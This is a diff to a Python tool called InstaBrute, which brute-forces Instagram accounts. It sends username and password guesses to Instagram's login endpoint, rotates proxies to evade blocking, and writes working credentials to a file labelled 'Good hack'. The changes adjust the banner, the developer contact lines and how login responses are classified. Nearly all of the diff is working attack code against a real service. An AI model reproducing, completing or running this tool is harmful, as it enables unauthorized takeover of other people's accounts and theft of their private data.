@@ -27,7 +27,7 @@ print('''
                             "F3  $r
                            $$$$.e$"  .
                            "$$$$$"   "
-     (insTof by 6)           $$$$c  /
+     (insTof by 7.0v)        $$$$c  /
         .                   $$$$$$$P
        ."c                      $$$
       .$c3b                  ..J$$$$$e
@@ -35,11 +35,16 @@ print('''
        $$$$b           .$$$$$$$$$$$$$$$$r
           $$$.        .$$$$$$$$$$$$$$$$$$
            $$$c      .$$$$$$$  "$$$$$$$$$r
-Author   : Falah
-snapchat : flaah999
-depend on vpn. Please use it before running the tool or providing a proxy file           """"""""""""""""""""""""""""""""""""""""""
+
+depend on vpn. Please use it before running the tool or providing a proxy file           
 ''')
 
+print ('''
+==============================================
+[developer] => FaLaH - 0xfff0800 [developer_email] => flaaah777@gmail.com ) 
+[developer_snapchat] => flaah999
+==============================================
+''')
 
 class InstaBrute(object):
     def __init__(self):
@@ -82,7 +87,7 @@ class InstaBrute(object):
         while 1:
             try:
                 print('')
-                print('[*] Check new ip...')
+                print(normal_color+'[*] Check new ip...')
                 response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
                                         timeout=10.0).text
                 if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
@@ -98,7 +103,9 @@ class InstaBrute(object):
             except Exception as e:
                 print('[*] Can\'t reach proxy "%s"' % proxy)
                 proxy = random.choice(plist)
+                os.system('cls')
             print('')
+			
 
     def cls(self):
         linux = 'clear'
@@ -106,7 +113,6 @@ class InstaBrute(object):
         os.system([linux, windows][os.name == 'nt'])
 
     def New_Br(self, user, pwd):
-        link = 'https://www.instagram.com/accounts/login/'
         login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
         time = int(datetime.now().timestamp())
@@ -119,7 +125,6 @@ class InstaBrute(object):
         }
 
         with requests.Session() as s:
-            r = s.get(link)
             r = s.post(login_url, data=payload, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
@@ -129,26 +134,30 @@ class InstaBrute(object):
 
             
             data = json.loads(r.text)
-            if (data['status'] == 'fail'):
-                print(red_color +'')
-                print(data['message'])
-                print('--> not proxy تحتاج بروكسي')
+            if 'message' in r.text:
+                print('----------------------------')
+                print(red_color+'--> not proxy تحتاج بروكسي')
                 UsePorxy = self.randomProxy()
-            print('----------------------------')
-            print (green_color + 'username: '+ user + ' | '' password: '+ pwd )
-            print('----------------------------')
+                print (whiteB_color + 'username: '+ user + ' | '' password: '+ pwd )
+                print(r.text)
+                print('----------------------------')
             if 'checkpoint_url' in r.text:
-                print(('' + user + ':' + pwd + ' --> Good hack '))
+                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
                 with open('good.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
-            if 'checkpoint_required' in r.text:
-                print(('' + user + ':' + pwd + ' --> Good hack '))
+                    exit()					
+            if 'userId' in r.text:
+                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
                 with open('good.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
-            elif 'two_factor_required' in r.text:
-                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
-                with open('results_NeedVerfiy.txt', 'a') as x:
-                    x.write(user + ':' + pwd + '\n')
+                    exit()
+            elif 'status' in r.text:
+                print (red_color + 'username: '+ user + ' | '' password: '+ pwd )
+                print(r.text)
+
+
+  
+
 
 
 
